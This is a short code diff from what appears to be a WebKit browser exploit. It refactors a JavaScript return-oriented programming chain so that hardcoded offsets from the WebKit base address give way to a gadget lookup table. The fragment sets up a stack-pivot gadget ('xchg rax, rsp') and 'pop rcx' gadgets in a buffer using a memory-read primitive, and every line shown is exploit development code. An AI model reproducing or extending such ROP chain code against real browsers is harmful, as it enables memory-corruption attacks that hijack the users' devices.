@@ -98,15 +98,13 @@ function RopChain() {
 
     this.execute = function() {
         debug_log("execute");
-        // xchg rax, rsp; dec dword ptr [rax - 0x77]; ret;
-        rop_buf[2] = webkit_base_addr.getLowBitsUnsigned() + 0xd9754; //cbuf[0x10] - ((0x60000 * 4) * 17) + 0xdcac1
-        rop_buf[3] = webkit_base_addr.getHighBitsUnsigned(); //cbuf[0x11]
+        var xchg = gadgets['xchg rax, rsp; dec dword ptr [rax - 0x77]'];
+        rop_buf[2] = xchg.addr().getLowBitsUnsigned()
+        rop_buf[3] = xchg.addr().getHighBitsUnsigned()
 
-        for(var i = -256; i < 256; i+=8)
-          debug_log(read64(new dcodeIO.Long(cbuf[0x10] - ((0x60000 * 4) * 4) + 0x168f4 + i, cbuf[0x11], true)).toString(16));
-        // pop rcx; pop rcx; ret;
-        rop_buf[0] = cbuf[0x10] - ((0x60000 * 4) * 4) + 0x168f4;
-        rop_buf[1] = cbuf[0x11]
+        var poprcxx2 = gadgets['pop rcx; pop rcx'];
+        rop_buf[0] = poprcxx2.addr().getLowBitsUnsigned()
+        rop_buf[1] = poprcxx2.addr().getHighBitsUnsigned()
 
         // Code to restore the stack pointer
         this.add('pop rax')
